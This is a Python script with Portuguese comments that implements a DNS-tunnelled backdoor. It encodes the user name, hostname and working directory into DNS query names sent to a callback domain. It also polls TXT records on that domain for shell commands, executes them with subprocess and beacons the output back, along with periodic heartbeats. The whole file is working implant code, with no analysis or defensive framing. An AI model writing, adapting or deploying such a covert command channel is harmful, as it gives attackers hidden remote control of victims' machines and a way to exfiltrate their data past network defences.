#!/usr/bin/env python3
import os, sys, base64, subprocess, time, threading
import dns.resolver, dns.name, dns.message, dns.query

# Configurações
CALLBACK_DOMAIN = "exemplo.com"
BEACON_INTERVAL = 60  # em segundos

def send_dns_beacon(data: bytes):
    chunk = base64.urlsafe_b64encode(data).decode().rstrip("=")
    qname = f"{chunk}.{CALLBACK_DOMAIN}"
    q = dns.message.make_query(qname, dns.rdatatype.TXT)
    try:
        dns.query.udp(q, "8.8.8.8", timeout=2)
    except Exception:
        pass

def collect_system_info():
    info = {
      "user": os.getenv("USER") or os.getenv("USERNAME"),
      "hostname": os.uname().nodename,
      "cwd": os.getcwd(),
    }
    return "|".join(f"{k}={v}" for k,v in info.items()).encode()

def shell_listener():
    while True:
        q = dns.message.make_query(f"cmd.{CALLBACK_DOMAIN}", dns.rdatatype.TXT)
        try:
            resp = dns.query.udp(q, "8.8.8.8", timeout=2)
            for ans in resp.answer:
                for item in ans.items:
                    cmd = item.strings[0].decode()
                    out = subprocess.getoutput(cmd)
                    send_dns_beacon(b"OUT:" + out.encode()[:200])
        except Exception:
            pass
        time.sleep(15)

def main():
    send_dns_beacon(b"HELLO")
    send_dns_beacon(collect_system_info())
    threading.Thread(target=shell_listener, daemon=True).start()
    while True:
        send_dns_beacon(b"HB")
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    main()
